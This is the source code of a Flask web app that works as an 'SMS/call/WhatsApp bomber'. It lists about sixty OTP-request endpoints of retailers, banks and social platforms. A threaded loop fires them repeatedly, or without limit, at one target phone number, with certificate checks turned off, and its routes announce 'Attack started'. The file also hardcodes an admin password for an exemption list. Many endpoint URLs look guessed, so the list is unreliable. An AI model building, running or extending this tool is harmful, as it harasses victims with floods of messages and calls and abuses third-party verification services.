import os
import json
import time
import random
import threading
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
import requests

app = Flask(__name__)
app.secret_key = os.urandom(24).hex()

# ─── CONFIG ─────────────────────────────────────────────
ADMIN_PASSWORD = "webcyber@#@#anmol"
NOBOM_FILE = "nobom.json"

# ─── NO-BOM LOAD/SAVE ──────────────────────────────────
def load_nobom():
    if not os.path.exists(NOBOM_FILE):
        return []
    with open(NOBOM_FILE, "r") as f:
        data = json.load(f)
        return data if isinstance(data, list) else []

def save_nobom(numbers):
    with open(NOBOM_FILE, "w") as f:
        json.dump(numbers, f, indent=2)

def is_blocked(phone):
    return phone in load_nobom()

# ─── THE APIS ───────────────────────────────────────────
ULTIMATE_APIS = [
    # ── CALL APIS ──
    {"name":"Tata Capital Voice","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}',"type":"call"},
    {"name":"1MG Voice Call","url":"https://www.1mg.com/auth_api/v6/create_token","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8"},"data":lambda p:f'{{"number":"{p}","otp_on_call":true}}',"type":"call"},
    {"name":"Swiggy Call","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"call"},
    {"name":"Myntra Voice","url":"https://www.myntra.com/gw/mobile-auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"call"},
    {"name":"Flipkart Voice","url":"https://www.flipkart.com/api/6/user/voice-otp/generate","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"call"},
    {"name":"Amazon Voice","url":"https://www.amazon.in/ap/signin","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","voice":true}}',"type":"call"},
    {"name":"Paytm Call","url":"https://paytm.com/api/auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"call"},
    {"name":"Zomato Call","url":"https://www.zomato.com/api/auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"call"},
    {"name":"Uber Call","url":"https://auth.uber.com/v2/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}"}}',"type":"call"},
    {"name":"Rapido Call","url":"https://api.rapido.in/v2/auth/call-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"call"},
    {"name":"Ola Call","url":"https://api.olacabs.com/v2/auth/voice","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"call"},
    {"name":"OYO Call","url":"https://api.oyorooms.com/api/v2/auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"call"},
    {"name":"Pharmeasy Call","url":"https://pharmeasy.in/api/auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"call"},
    {"name":"BigBasket Call","url":"https://bigbasket.com/api/auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"call"},
    {"name":"Zepto Call","url":"https://zepto.in/api/v2/auth/call","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"call"},
    {"name":"BookMyShow Call","url":"https://bookmyshow.com/api/auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"call"},
    {"name":"JioMart Call","url":"https://jiomart.com/api/auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"call"},

    # ── SMS APIS ──
    {"name":"LinkedIn SMS","url":"https://www.linkedin.com/uas/verification/send-verification-code","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}","country":"in"}}',"type":"sms"},
    {"name":"WhatsApp Biz SMS","url":"https://business.whatsapp.com/send-verification-code","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"91{p}"}}',"type":"sms"},
    {"name":"Signal SMS","url":"https://api.signal.org/v1/accounts/verification","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}","region":"IN"}}',"type":"sms"},
    {"name":"Discord SMS","url":"https://discord.com/api/v9/auth/phone/verification","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}","country":"IN"}}',"type":"sms"},
    {"name":"Twitter/X SMS","url":"https://x.com/i/api/1.1/account/phone/verification_code.json","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}"}}',"type":"sms"},
    {"name":"Telegram SMS","url":"https://telegram.org/auth/send_code","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}","api_id":"12345"}}',"type":"sms"},
    {"name":"Microsoft SMS","url":"https://login.microsoftonline.com/common/phone/sendcode","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}","country":"IN"}}',"type":"sms"},
    {"name":"Apple SMS","url":"https://appleid.apple.com/auth/verify/phone","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}","countryCode":"91"}}',"type":"sms"},
    {"name":"Amazon SMS","url":"https://www.amazon.in/ap/signin","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobileNumber":"{p}","countryCode":"91","type":"login"}}',"type":"sms"},
    {"name":"Myntra SMS","url":"https://www.myntra.com/api/v1/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","countryCode":"91"}}',"type":"sms"},
    {"name":"Flipkart SMS","url":"https://grocery.flipkart.com/api/v1/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","countryCode":"91"}}',"type":"sms"},
    {"name":"Nykaa SMS","url":"https://api.nykaa.com/auth/v1/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","country":"IN"}}',"type":"sms"},
    {"name":"Ola SMS","url":"https://api.olacabs.com/v1/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","countryCode":"91"}}',"type":"sms"},
    {"name":"Rapido SMS","url":"https://api.rapido.in/v1/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","countryCode":"91"}}',"type":"sms"},
    {"name":"OYO SMS","url":"https://api.oyorooms.com/api/pwa/generateotp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"country_code":"+91","phone":"{p}"}}',"type":"sms"},
    {"name":"Uber SMS","url":"https://www.uber.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}"}}',"type":"sms"},
    {"name":"Swiggy SMS","url":"https://www.swiggy.com/api/v1/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"sms"},
    {"name":"Zomato SMS","url":"https://www.zomato.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
    {"name":"Paytm SMS","url":"https://paytm.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"sms"},
    {"name":"Google SMS","url":"https://accounts.google.com/_/signin/sms/challenge","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phoneNumber":"+91{p}","countryCode":"IN"}}',"type":"sms"},
    {"name":"Facebook SMS","url":"https://m.facebook.com/api/auth/send_otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}","country":"IN"}}',"type":"sms"},
    {"name":"Instagram SMS","url":"https://i.instagram.com/api/v1/accounts/send_otp/","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone_number":"+91{p}"}}',"type":"sms"},
    {"name":"Netflix SMS","url":"https://www.netflix.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}"}}',"type":"sms"},
    {"name":"CRED SMS","url":"https://api.cred.club/v1/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
    {"name":"Groww SMS","url":"https://groww.in/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
    {"name":"Zerodha SMS","url":"https://zerodha.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
    {"name":"PhonePe SMS","url":"https://phonepe.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
    {"name":"Google Pay SMS","url":"https://pay.google.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}"}}',"type":"sms"},
    {"name":"BHIM SMS","url":"https://bhimupi.in/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
    {"name":"HDFC SMS","url":"https://netbanking.hdfcbank.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
    {"name":"ICICI SMS","url":"https://icicibank.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
    {"name":"SBI SMS","url":"https://online.sbi/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
    {"name":"Axis SMS","url":"https://axisbank.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
    {"name":"Meesho SMS","url":"https://meesho.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
    {"name":"Pharmeasy SMS","url":"https://pharmeasy.in/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
    {"name":"Tata 1mg SMS","url":"https://www.1mg.com/auth_api/v6/create_token","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"number":"{p}","otp_on_call":false}}',"type":"sms"},
    {"name":"Amazon Prime","url":"https://primevideo.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}"}}',"type":"sms"},
    {"name":"Disney+ Hotstar","url":"https://hotstar.com/api/auth/sms","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}"}}',"type":"sms"},

    # ── WHATSAPP APIS ──
    {"name":"WhatsApp OTP","url":"https://web.whatsapp.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"91{p}"}}',"type":"whatsapp"},
    {"name":"WhatsApp Code","url":"https://web.whatsapp.com/api/send_code","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"cc":"91","phone":"{p}","method":"sms"}}',"type":"whatsapp"},
    {"name":"WhatsApp Direct","url":"https://api.whatsapp.com/send/verification","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"91{p}","method":"sms"}}',"type":"whatsapp"},
    {"name":"WhatsApp Business","url":"https://business.whatsapp.com/api/verification","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","country":"IN"}}',"type":"whatsapp"},
]

# ─── BOMBER ENGINE (Threading-based, NO asyncio) ────────
class BomberEngine:
    def __init__(self):
        self.running = False
        self.stats = {"sms_sent": 0, "calls_sent": 0, "whatsapp_sent": 0, "total": 0, "failed": 0}
        self._thread = None
        self._lock = threading.Lock()

    def _hit_api(self, api, phone):
        """Send one API request synchronously using requests library"""
        try:
            data_str = api["data"](phone)
            headers = api.get("headers", {"Content-Type": "application/json"})
            timeout = 10

            if api["method"] == "POST":
                resp = requests.post(api["url"], headers=headers, data=data_str, timeout=timeout, verify=False)
            else:
                resp = requests.get(api["url"], headers=headers, params=data_str, timeout=timeout, verify=False)

            if resp.status_code in [200, 201, 202, 204, 302, 301]:
                return True
            return False
        except requests.exceptions.SSLError:
            # Retry without SSL verification
            try:
                if api["method"] == "POST":
                    resp = requests.post(api["url"], headers=headers, data=data_str, timeout=timeout, verify=False)
                else:
                    resp = requests.get(api["url"], headers=headers, params=data_str, timeout=timeout, verify=False)
                return resp.status_code in [200, 201, 202, 204, 302, 301]
            except:
                return False
        except:
            return False

    def _bomb_loop(self, phone, types, count):
        """Main bombing loop - runs in a background thread"""
        # Suppress SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        selected_apis = [a for a in ULTIMATE_APIS if a["type"] in types]
        if not selected_apis:
            self.running = False
            return

        unlimited = (count == -1)
        sent = 0

        with self._lock:
            self.stats = {"sms_sent": 0, "calls_sent": 0, "whatsapp_sent": 0, "total": 0, "failed": 0}

        self.running = True

        while self.running and (unlimited or sent < count):
            random.shuffle(selected_apis)
            for api in selected_apis:
                if not self.running:
                    break
                if not unlimited and sent >= count:
                    break

                success = self._hit_api(api, phone)
                with self._lock:
                    if success:
                        self.stats["total"] += 1
                        sent += 1
                        if api["type"] == "sms":
                            self.stats["sms_sent"] += 1
                        elif api["type"] == "call":
                            self.stats["calls_sent"] += 1
                        elif api["type"] == "whatsapp":
                            self.stats["whatsapp_sent"] += 1
                    else:
                        self.stats["failed"] += 1

                time.sleep(0.3)

        self.running = False

    def start(self, phone, types, count):
        """Start bombing in a background thread"""
        if self.running:
            return False

        self._thread = threading.Thread(target=self._bomb_loop, args=(phone, types, count), daemon=True)
        self._thread.start()
        return True

    def stop(self):
        self.running = False

    def get_stats(self):
        with self._lock:
            return dict(self.stats)

# Global engine instance
engine = BomberEngine()

# ─── ROUTES ──────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/start", methods=["POST"])
def api_start():
    data = request.json
    phone = data.get("phone", "").strip()
    types = data.get("types", [])
    count = data.get("count", 10)

    if not phone or not phone.isdigit() or len(phone) != 10:
        return jsonify({"success": False, "error": "Invalid phone number! 10 digits required."})

    if is_blocked(phone):
        return jsonify({"success": False, "error": "⚠️ This number is in the NO-BOM list! Cannot attack."})

    if not types:
        return jsonify({"success": False, "error": "Select at least one: SMS, Call, or WhatsApp."})

    if count == "unlimited":
        count = -1
    else:
        count = int(count)

    if engine.running:
        return jsonify({"success": False, "error": "Bomber already running! Stop first."})

    engine.start(phone, types, count)
    return jsonify({"success": True, "message": f"Attack started on +91{phone}!"})

@app.route("/api/stop", methods=["POST"])
def api_stop():
    engine.stop()
    return jsonify({"success": True, "message": "Bomber stopped!"})

@app.route("/api/stats")
def api_stats():
    return jsonify(engine.get_stats())

@app.route("/api/status")
def api_status():
    return jsonify({"running": engine.running})

@app.route("/settings", methods=["GET", "POST"])
def settings():
    if request.method == "POST":
        pwd = request.form.get("password", "")
        if pwd == ADMIN_PASSWORD:
            session["auth"] = True
            return redirect(url_for("dashboard"))
        return render_template("settings.html", error="❌ Wrong password!")

    if session.get("auth"):
        return redirect(url_for("dashboard"))
    return render_template("settings.html")

@app.route("/dashboard")
def dashboard():
    if not session.get("auth"):
        return redirect(url_for("settings"))
    numbers = load_nobom()
    return render_template("dashboard.html", numbers=numbers)

@app.route("/api/nobom/add", methods=["POST"])
def api_nobom_add():
    if not session.get("auth"):
        return jsonify({"success": False, "error": "Unauthorized!"})
    data = request.json
    phone = data.get("phone", "").strip()
    if not phone or not phone.isdigit() or len(phone) != 10:
        return jsonify({"success": False, "error": "Invalid number!"})
    numbers = load_nobom()
    if phone not in numbers:
        numbers.append(phone)
        save_nobom(numbers)
    return jsonify({"success": True, "numbers": numbers})

@app.route("/api/nobom/remove", methods=["POST"])
def api_nobom_remove():
    if not session.get("auth"):
        return jsonify({"success": False, "error": "Unauthorized!"})
    data = request.json
    phone = data.get("phone", "").strip()
    numbers = load_nobom()
    if phone in numbers:
        numbers.remove(phone)
        save_nobom(numbers)
    return jsonify({"success": True, "numbers": numbers})

@app.route("/api/nobom/list")
def api_nobom_list():
    if not session.get("auth"):
        return jsonify({"success": False, "error": "Unauthorized!"})
    return jsonify({"numbers": load_nobom()})

@app.route("/logout")
def logout():
    session.pop("auth", None)
    return redirect(url_for("settings"))

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)